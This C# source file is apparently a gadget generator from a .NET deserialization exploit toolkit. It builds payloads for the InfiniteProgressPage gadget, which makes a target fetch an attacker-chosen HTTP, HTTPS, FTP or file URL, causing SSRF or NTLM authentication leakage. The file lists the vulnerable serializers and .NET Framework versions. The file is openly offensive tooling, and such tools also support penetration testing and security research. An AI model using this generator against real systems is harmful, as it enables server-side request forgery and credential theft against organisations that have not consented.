using NDesk.Options;
using System.Collections.Generic;
using ysonet.Helpers;

namespace ysonet.Generators
{
    public class InfiniteProgressPageGenerator : GenericGenerator
    {
        private bool rawInput;

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.Network)
                .WithRequirements(GadgetRequirement.ExtraAssembly, GadgetRequirement.NetFramework)
                // fired on 4.8.1
                .WithVersions(RuntimeVersion.Range(RuntimeVersion.NetFx40, RuntimeVersion.NetFx481));
        }

        public override string Finders()
        {
            return "Piotr Bazydlo";
        }

        public override string AdditionalInfo()
        {
            return "Microsoft.ApplicationId.Framework.InfiniteProgressPage loads the supplied HTTP, HTTPS, FTP, or file URL through AnimatedPictureFile. This can trigger SSRF or NTLM authentication. The target needs Microsoft.ApplicationId.Framework.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.JsonNet,
                Formatters.FastJson,
                Formatters.JavaScriptSerializer,
                "YamlDotNet < 5.0.0",
                "SharpSerializerXml",
                Formatters.Xaml
            };
        }

        public override CommandInputType CommandInput()
        {
            return CommandInputType.Url;
        }

        public override OptionSet Options()
        {
            return NonRceGadgetPayloadBuilder.RawInputOption(v => rawInput = v);
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            NonRceGadgetPayloadBuilder.RequireInput(inputArgs.Cmd, Name());
            object payload = NonRceGadgetPayloadBuilder.InfiniteProgressPage(inputArgs.Cmd, formatter, rawInput);
            return NonRceGadgetPayloadBuilder.Finish(payload, formatter, inputArgs);
        }
    }
}
